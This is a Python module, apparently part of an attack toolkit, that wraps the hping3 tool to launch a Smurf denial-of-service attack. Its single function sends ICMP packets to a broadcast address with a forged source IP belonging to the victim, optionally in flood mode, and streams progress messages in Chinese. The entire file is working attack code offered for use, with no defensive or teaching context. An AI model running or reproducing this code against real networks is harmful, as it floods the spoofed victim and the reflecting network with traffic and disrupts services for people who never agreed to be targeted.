import subprocess
import time
import threading

def attack(broadcast_ip=None, ip=None, packet_count=10, callback=None, spoof_ip=None, stop_event=None, **kwargs):
    if not spoof_ip:
        callback("[hping3] Smurf 攻擊需提供被冒充的 IP（spoof_ip）作為受害者。")
        return False

    callback(f"[hping3] 發動 Smurf 攻擊至廣播地址 {broadcast_ip}，冒充來源：{spoof_ip}")

    cmd = ["sudo", "hping3", broadcast_ip, "--icmp", "-a", spoof_ip]
    if packet_count == -1:
        cmd += ["--flood"]
    else:
        cmd += ["-c", str(packet_count)]

    callback(f"[hping3] 執行指令：{' '.join(cmd)}")

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

        def monitor_stop():
            while not (stop_event and stop_event.is_set()):
                if proc.poll() is not None:
                    break
                time.sleep(0.1)
            if stop_event and stop_event.is_set():
                callback("[hping3] 收到停止請求，正在終止攻擊...")
                try:
                    proc.terminate()
                    proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    callback("[hping3] 攻擊未正常終止，強制終止...")
                    proc.kill()
                    proc.wait()

        threading.Thread(target=monitor_stop, daemon=True).start()

        for line in proc.stdout:
            callback(f"[hping3] {line.strip()}")
            if stop_event and stop_event.is_set():
                break

        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc.kill()

        callback(f"[hping3] 攻擊結束，返回碼：{proc.returncode}")
        return proc.returncode == 0

    except Exception as e:
        callback(f"[hping3] 錯誤：{e}")
        return False
